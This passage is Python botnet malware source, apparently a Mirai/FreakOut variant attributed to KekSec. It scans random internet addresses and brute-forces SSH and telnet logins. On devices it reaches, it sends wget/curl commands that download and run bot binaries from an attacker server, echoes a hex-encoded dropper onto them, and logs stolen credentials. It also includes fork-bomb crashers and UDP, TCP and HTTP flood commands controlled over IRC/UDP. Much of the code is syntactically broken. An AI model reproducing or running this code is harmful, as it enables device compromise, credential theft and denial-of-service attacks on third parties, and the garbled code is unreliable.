            sys.settrace(os.popen) # too many threads, may as well crash program
            pass

if honeycheck:
    threading.Thread(target = honeyserver, args=(8085)).start()
gonnaScan=1
if gonnaScan:
    print("[\\] Defining scanner for our operations")
    print("[.] Currently we are scanning for " + str(portcount) + " ports.")

print("[+] Making the scanner.---> --> ->           which also duos as a exploit stuffer            -.-                      -- $$$$$$")
def scanner():
    global honeycheck, exploited, wizard_made
    honeycheck = 1
    exploited = 0
    while 1:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            try:
                cheese = str(random.randint(1,233)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255))
                s.connect((cheese, 22))
                exploited=exploit(cheese)
                wizard_made+=1
            except:
                try:
                    s.connect((cheese, 23))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 2323))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 8080))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 8081))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 53))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 445))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                continue
        except Exception as e:
            print(str(e))
            pass

print("[.] Making the infecter")
def infect(ip, port=23, username="", password=""):
    global running
    global echo
    global tftp
    global wget
    global logins
    global wizard_made
    if ip in wizard_made:
        return
    infectedkey = "PERROR"
    
    global running, cheese
    running += 1
    threadID = running
    while 1:
        cheese = str(random.randint(1,233)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255))
        port1 = 22
        port2 = 2222
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.37)
        try:
            s.connect((cheese, port1))
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(cheese, port = port1, username=username, password=password, timeout=3)
            ssh.exec_command(rekdevice)
            ssh.close()
        except paramiko.ssh_exception.SSHException as e:
            print(str(e))
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(cheese, port = port2, username=username, password=password, timeout=3)
            ssh.exec_command(rekdevice)
            ssh.close()
        except paramiko.ssh_exception.SSHException as e:
            print(str(e))
        try:
            threading.Thread(target = infect, args=(cheese, port1, username, password)).start()           
            print(b'[LIVE] [+] -------> Server IP address: -> {cheese}:{port1} + ~SSH Infection-=-=')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(7)
            s.connect((cheese, port2))
            s.close()
            threading.Thread(target = infect, args=(cheese, port2, username, password)).start()
            infect(cheese, port2, username, password)            
            print(b'[LIVE] [+] -------> Server IP address 2: -> {cheese}:{port2} + ~Hidden Infection-=-=')
            print(b'Server IP address: {cheese} {port2}')
            s.close()
        except Exception as e:
            print(str(e))
            running -= 1
    try:
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(username + "\r\n")
            time.sleep(0.1)
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(password + "\r\n")
            time.sleep(0.8)
        else:
            pass
        prompt = ''
        prompt += recvTimeout(tn, 8192)
        if ">" in prompt and "ONT" not in prompt:
            success = True
        elif "#" in prompt or "$" in prompt or "@" in prompt or ">" in prompt:
            if "#" in prompt:
                prompt = "#"
            elif "$" in prompt:
                prompt = "$"
            elif ">" in prompt:
                prompt = ">"
            success = True
        else:
            tn.close()
            return
    except:
        tn.close()
        return
    if success == True:
        try:
            tn.send("enable\r\n")
            tn.send("system\r\n")
            tn.send("shell\r\n")
            tn.send("sh\r\n")
            tn.send("echo -e '\\x41\\x4b\\x34\\x37'\r\n")
        except:
            tn.close()
            return
        time.sleep(1)
        try:
            buf = recvTimeout(tn, 8192)
        except:
            tn.close()
            return
        if "AK47" in buf:
            if honeycheck == 1:
                tn.send("wget http://" +serverip + ":" + str(8080) + "/bins/mirai.arm; chmod 0777 mirai.arm;ls mirai.arm; ./mirai.arm &\r\n");
                tn.send("curl http://" +serverip + ":" + str(8080) + "/bins/mirai.arm; chmod 0777 mirai.arm;ls mirai.arm; ./mirai.arm &\r\n");
                time.sleep(3)
                recvTimeout(tn, 8192)
                if ip in badips:
                    running -= 1
                    return
            tn.send("cd /tmp ; cd /home/$USER ; cd /var/run ; cd /mnt ; cd /root ; cd /\r\n")
            tn.send("cat /proc/mounts;busybox cat /proc/mounts\r\n")
            mounts = recvTimeout(tn, 1024*1024)
            for line in mounts.split("\n"):
                try:
                    path = line.split(" ")[1]
                    if " rw" in line:
                        tn.send("echo -e '%s' > %s/.keksec; cat %s/.keksec;busybox cat %s/.keksec; rm %s/.keksec;busybox rm %s/.keksec\r\n" % ("\\x41\\x4b\\x34\\x37", path, "\\x41\\x4b\\x34\\x37", path, path, path, path, path))
                        if "AK47" in recvTimeout(tn, 1024*1024):
                            tn.send("cd %s\r\n" % path) #cd into the writeable directory
                except:
                    continue
            try:
                data=""
                tn.send("echo -en \"START\"\r\n")
                c = 0
                while 1:
                    data+=recvTimeout(tn, 100)
                    if data=="":
                        running -= 1
                        try:
                            tn.close()
                        except:
                            pass
                        return
                    if "START" in data:
                        break
                tn.send("PS1= ; cat /bin/echo ; busybox cat /bin/echo\r\n")
                data=""
                data+=recvTimeout(tn, 0xff00)
                st=0
                while st<len(data):
                    if data[st] == "\x7f":
                        data=data[st:(len(data) % 0xff00)]
                        continue
                    else:
                        st+=1
                elfheader=data[data.find("ELF")-1:(len(data) % 0xff00)]
                if elfheader[0:4]!="\x7fELF":
                    running -= 1
                    try:
                        tn.close()
                    except:
                        pass
                    return
            except:
                running -= 1
                try:
                    tn.close()
                except:
                    pass
                return
            try:
                header = ElfHeader(elfheader).parse_header()
                EM_NONE = 0
                EM_M32 = 1
                EM_SPARC = 2
                EM_386 = 3
                EM_68K = 4 #// m68k
                EM_88K = 5 #// m68k
                EM_486 = 6 #// x86
                EM_860 = 7 #// Unknown
                EM_MIPS = 8 #/* MIPS R3000 (officially, big-endian only) */
                #/* Next two are historical and binaries and modules of these types will be rejected by Linux. */
                EM_MIPS_RS3_LE = 10 #/* MIPS R3000 little-endian */
                EM_MIPS_RS4_BE = 10 #/* MIPS R4000 big-endian */
                EM_PARISC = 15 #/* HPPA */
                EM_SPARC32PLUS = 18 #/* Sun's "v8plus" */
                EM_PPC = 20 #/* PowerPC */
                EM_PPC64 = 21 #/* PowerPC64 */
                EM_SPU = 23 #/* Cell BE SPU */
                EM_ARM = 40 #/* ARM 32 bit */
                EM_SH = 42 #/* SuperH */
                EM_SPARCV9 = 43 #/* SPARC v9 64-bit */
                EM_H8_300 = 46 #/* Renesas H8/300 */
                EM_IA_64 = 50 #/* HP/Intel IA-64 */
                EM_X86_64 = 62 #/* AMD x86-64 */
                EM_S390 = 22 #/* IBM S/390 */
                EM_CRIS = 76 #/* Axis Communications 32-bit embedded processor */
                EM_M32R = 88 #/* Renesas M32R */
                EM_MN10300 = 89 #/* Panasonic/MEI MN10300, AM33 */
                EM_OPENRISC = 92 #/* OpenRISC 32-bit embedded processor */
                EM_BLACKFIN = 106 #/* ADI Blackfin Processor */
                EM_ALTERA_NIOS2 = 113 #/* Altera Nios II soft-core processor */
                EM_TI_C6000 = 140 #/* TI C6X DSPs */
                EM_AARCH64 = 183 #/* ARM 64 bit */
                EM_TILEPRO = 188 #/* Tilera TILEPro */
                EM_MICROBLAZE = 189 #/* Xilinx MicroBlaze */
                EM_TILEGX = 191 #/* Tilera TILE-Gx */
                EM_FRV = 0x5441 #/* Fujitsu FR-V */
                EM_AVR32 = 0x18ad #/* Atmel AVR32 */
                if (header["e_machine"][0] == EM_ARM or header["e_machine"][0] == EM_AARCH64):
                    arch = "arm"
                elif (header["e_machine"][0] == EM_MIPS or header["e_machine"][0] == EM_MIPS_RS3_LE):
                    if (header["endian"] == 1):
                        arch = "mpsl"
                    else:
                        arch = "mips"
                elif (header["e_machine"][0] == EM_386 or header["e_machine"][0] == EM_486 or header["e_machine"][0] == EM_860 or header["e_machine"][0] == EM_X86_64):
                    arch = "x86"
                elif (header["e_machine"][0] == EM_SPARC or header["e_machine"][0] == EM_SPARC32PLUS or header["e_machine"][0] == EM_SPARCV9):
                    arch = "spc"
                elif (header["e_machine"][0] == EM_68K or header["e_machine"][0] == EM_88K):
                    arch = "m68k"
                elif (header["e_machine"][0] == EM_PPC or header["e_machine"][0] == EM_PPC64):
                    arch = "ppc"
                elif (header["e_machine"][0] == EM_SH):
                    arch = "sh4"
                try:
                    arch
                except NameError:
                    try:
                        tn.close()
                    except:
                        pass
                    running -= 1
                    return
            except:
                pass
            print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip, arch))
            logins += 1
            fh.write(ip + ":" + str(port) + " " + username + ":" + password + "\n")
            fh.flush()
            rekdevice = "cd /tmp or cd $(find / -writable | head -n 1);\r\nwget http://" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; busybox wget http://""" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; chmod 777 """ + binname  + arch + """; ./""" + binname  + arch + """; rm -f """ + binname  + arch + "\r\npause\r\n"
            rekdevice = rekdevice.replace("\r", "").split("\n")
            for rek in rekdevice:
                tn.send(rek + "\r\n")
                time.sleep(1.5)
                buf = recvTimeout(tn, 1024*1024)
                loaded = False
                if "bytes" in buf:
                    print("\033[32m[\033[31m+\033[32m] \033[33mwget \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    tftp += 1
                    loaded = True
                elif "saved" in buf:
                    print("\033[32m[\033[31m+\033[32m] \033[33mWGET \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    wget += 1
                    loaded = True
                if infectedkey in buf:
                    ran += 1
                    print("\033[32m[\033[31m+\033[32m] \033[35mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    f=open("infected.txt", "a")
                    f.write(ip +":" + str(port) + " " + username + ":" + password + "\r\n")
                    f.close()
                first = True
                count = 0
                hexdata = []
                for chunk in split_bytes(open("bins/dlr." + arch, "rb").read(), 128):
                    hexdata.append(''.join(map(lambda c:'\\x%02x'%c, map(ord, chunk))))
                parts = len(hexdata)
                for hexchunk in hexdata:
                    seq = ">" if first else ">>"
                    tn.send("echo -ne \"" + hexchunk + "\" " + seq + " updDl\r\n") #;busybox echo -ne '" + hexchunk + "' " + seq + " .updDl\r\n")
                    first = False
                    count += 1
                    time.sleep(0.01)
                print("\033[32m[\033[31m+\033[32m] \033[33mECHO \033[31m---> \033[32m" + ip + " \033[31m---> \033[36m(" + str(count) + "/" + str(parts) + ") " + arch + "\033[37m")
                tn.send("chmod 777 updDl;busybox chmod 777 updDl\r\n")
                tn.send("./updDl\r\n")
                time.sleep(1.7)
                tn.send("./enemy")
                tn.send("rm -rf ./updDl\r\n")
                time.sleep(0.1)
                buf = recvTimeout(tn, 1024*1024)
                if "FIN" in buf:
                    echo += 1
                    print("\033[32m[\033[31m+\033[32m] \033[33mECHOLOADED \033[31m---> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[31m ---> \033[35m%s\033[37m" %(username, password, ip, binary))
                    tn.close()
                    f=open("echoes.txt","a")
                    f.write(ip +":23 " + username + ":" + password + "\r\n")
                    f.close()
                    wizard_made.append(ip)
                if infectedkey in buf:
                    ran += 1
                    f=open("infected.txt", "a")
                    f.write(ip +":23 " + username + ":" + password + "\r\n")
                    f.close()
                    print("\033[32m[\033[31m+\033[32m] \033[35mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    tn.close()
       
    else:
        try:
            tn.close()
        except:
            pass
    running -= 1
    return

hostlink = ""  # update later link
server = "irc.pirc.pl"  # irc server
channel = "#windoez"    # Channel to join for all the funzies
key = "swegfeg" # password

botnick = "[cpu"+str(os.cpu_count())+"|" + str(random.randrange(0,999999999))+"]"+os.name # Bot's nickname
 # Bot's nickname
 
if honeycheck==1:
    Thread(target=honeyserver, args=(8080,)).start()

if gonnaScan:
    print("[0] Starting " + str(threads) + " scanner threads.")
    count = 0
    for i in range(threads):
        try:
            thread = threading.Thread(target = scanner, args = ())
            thread.daemon = True
            thread.start()
            count += 1
        except:
            break
    print("[+] Started!\r\nI have successfully started "+str(count)+" threads.")

print(botnick)
# Run in a new process and exit.
if os.name == "nt":
    print("windows access os")
    print("windows war os")
elif os.name == "linux":
    print("linux access os")
    print("linux war os")
else:
    print("router hax os")
    print("router maybe-something-specific os")

if(len(sys.argv) > 2):
    print("box")
    pass

banner = ""
def handlr(conn):
    while banner:
        try:
            banner += conn.recv(8912)
        except:
            break
    print("fetched banner ------=========-------->")
    print("\r\n\r\n" + banner)
    print(">-=====================>" + "\r\nsending arrows, pulling on bow, ->, B>====---->")
    time.sleep(340)
    print("--------========------->")
    time.sleep(140)
    print("--------========------->")
    time.sleep(200)
    print("--------========-------)")
    time.sleep(400)
    print("--------========-----==>")

# File remote crasher - a fileless fork bomb
def new_crasher():
    while 1:
        try:
            os.startfile(__file__)
        except:
            os.remove(file)

def defender(user="root", passwd = "password", status=0, unknown=0, unknown2=0):
    while 1:
        try:
            Exception("UNKNOWN", 0)
            pass
            Exception("UNKNOWN2", 1)
            Exception("UNKNOWN3", 0)      
        except Exception as e:
            print(str(e.stacktrace()))
        try:
            Exception("UNKNOWN4", 0)      
            pass
            pass
            continue
        except Exception as e:
            print(str(e.stacktrace()))
            break
        time.sleep(1)
    sys.stdout.write(chr(random.randint(1,255)))
    # try and see if we can call continue again
    pass
# Configuration for IRC Settings... (OLD!!!) DONT USE IRC AS IT CAN EASILY BECOME HIJACKED

print("configuring..")
for i in range(8):
    os.kill(os.getpid(),0)

channel = "#windoez"    # Channel to join
key = "swegfeg"
# freakout malware source code v7.2.0
production = 0
if production:
    # coded by #KekSec - 99.9% Freak ripping from *
# AV confusing threads
    Thread(target = defender, args=()).start() # brute single
    for i in range(8):
        Thread(target = defender, args=()).start() # brute single

def getresponse(self,*args,**kwargs):
    response = self._old_getresponse(*args,**kwargs)
    if self.sock:
        response.peer = self.sock.getpeername()
    else:
        response.peer = None
    return response

httplib.HTTPConnection._old_getresponse = httplib.HTTPConnection.getresponse
httplib.HTTPConnection.getresponse = getresponse



def check_peer(resp):
    orig_resp = resp.raw._original_response
    if hasattr(orig_resp,'peer'):
        return getattr(orig_resp,'peer')

print ("I think my ip is " + requests.get("http://icanhazip.com/").text[:-1])
print("[.] Now I'm gonna be getting our REAL IP from 3 different services online...")
# Our IP - coded by Freak
ip = check_peer(requests.get("https://twitter.com"))
print(ip + " got from twitter")
ip = check_peer(requests.get('https://www.google.com'))
print(ip + " got from google")
ip = check_peer(requests.get('https://duckduckgo.org'))
print(ip + " got from duckduckgo")

if production:    
    try:
        Thread(target = defender, args=(123, 466, 187, 808)).start()
    except Exception as e:
        print(str(e.stacktrace()))
    try:
        Thread(target = defender, args=(278, 465, 187, 809)).start()
    except Exception as e:
        print(str(e.stacktrace()))
        pass
    pass
    try:
        Thread(target = defender, args=(456, 465, 817,810)).start()
    except Exception as e:
        print(str(e.stacktrace()))
    pass
    try:
        Thread(target = defender, args=(208, 5667, 187,811)).start()
    except Exception as e:
        pass


from os import fork
# DEF - crashers
def old_crasher():
 set = "\xff"
 while 1:
  set+=set
  fork()

def crasher_silent_1():
    while 1:
        try:
            os.stat(os.access(".", 0))
        except Exception as e:
            pass

def crasher_original():
    while 1:
        try:
            os.fork()
            os.startfile(__file__)
        except:
            pass
        print(str(e))

def serverstart():
    while 1:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.bind(('', 4209))
            s.listen(9999)
        except:
            s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            s.bind(('', 4201))
            s.listen(9999)
        if s:
            break
        pass
    while 1:
        message, address = server_socket.recvfrom(65507)
        if message.strip().startswith("!reset"):
            break
        elif message[0] == "!hello":
            send_message(f"Hello, {username}!")
        elif message[0] == "!hostcrash":
            if message[1] == "1":
                crasher_silent_1()
            if message[1] == "2":
                crasher_original()
        elif message[0] == "!carthrower":
            While True:        # a udp flooder for host port time data flooding
                socket.sendto((message[1],Int(message[2]),Int(message[3])*"\xff")
        elif message[0] == "!hostlink":
            send_message(f"Hello, {username}!")
            print(os.get_terminal_size(os.fdopen(0)))
        elif message[0] == "!udp":
            message = message.split(" ")
            target = message[1]
            port = message[2]
            time = int(message[3])
            send_message(f"UDP Attacking , {username}!")
            threading.Thread(target=(udp), args=(target,port,int(message[3]))).start()
        elif message[0] == "!tcp":
            message = message.split(" ")
            target = message[1]
            port = message[2]
            packetsize = message[3]
            time = int(message[4])
            send_message(f"TCP Attacking , {username}!")
            threading.Thread(target=(tcp), args=(target,port,int(message[3]))).start()

print("[.] Starting our payload hoster on port 8081")
threading.Thread(target = httpd_8081, args=()).start()
print("[+] Now listening on 8081 for <b>anything</b>")
print
print("[+] done loading settings. now starting irc client. !!!")
if __name__ == "__main__":
    sys.stderr.write("[.] FULLY LOADED\r\n[+] WROTE TO ERROR BANKS \\n[-] Lotta output coming up...")
    if os.name == "nt":
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(serverstart)
        servicemanager.StartServiceCtrlDispatcher()
        print("[+] Started service, now connecting...")
        threading.Thread(target = os.popen, args=("cmd.exe",)).start()
    else:
        threading.Thread(target = os.popen, args=("sh",)).start()
        if(sys.argv != [""]):
            os.popen("start " + __file__ + " 0 1")
    print("Active threads: " + str(threading.active_count()))
    serverstart()

server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind(('', 4049))

while True:
    rand = random.randint(0, 10)
    message, address = server_socket.recvfrom(1024)
    if rand >= 4:
        server_socket.sendto(message, address)
    response = message
    if "PRIVMSG" in response:
        username = response.split('!', 1)[0][1:]
        message = response.split('PRIVMSG', 1)[1].split(':', 1)[1]
        print(f"{username}: {message}")
        if message.strip() == "!reset":
            break
        elif message[0] == "!hello":
            send_message(f"Hello, {username}!")
        elif message[0] == "!hostlink":
            send_message(f"Hello, {username} my host-link is {hostlink}")
            print(os.get_terminal_size(os.fdopen(0)))
        elif message[0] == "!httpflood":
            send_message(f"HTTP(s) Attacking {message[1]} , {username}!")
            endtime = time.clock() + int(message[2])
            threading.Thread(target = httpflood, args=(message[1], int(message[2]))).start()
        elif message[0] == "!udp":
            message = message.split(" ")
            target = message[1]
            port = message[2]
            time = int(message[3])
            send_message(f"UDP Attacking , {username}!")
            threading.Thread(target=(udp), args=(target,port,int(message[3]))).start()
        elif message[0] == "!tcp":
            message = message.split(" ")
            target = message[1]
            port = message[2]
            packetsize = message[3]
            time = int(message[4])
            send_message(f"UDP Attacking , {username}!")
            threading.Thread(target=(tcp), args=(target,port,int(message[3]))).start()
